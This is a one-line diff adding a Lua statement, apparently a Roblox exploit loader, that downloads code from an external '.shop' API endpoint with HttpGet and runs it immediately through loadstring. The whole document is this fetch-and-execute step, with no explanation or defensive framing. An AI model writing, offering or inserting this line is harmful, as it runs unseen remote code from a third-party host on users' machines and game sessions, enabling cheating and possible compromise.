@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://valaxscrub.shop/api/loader/6a749b065d7ca5e32973c5f7"))()
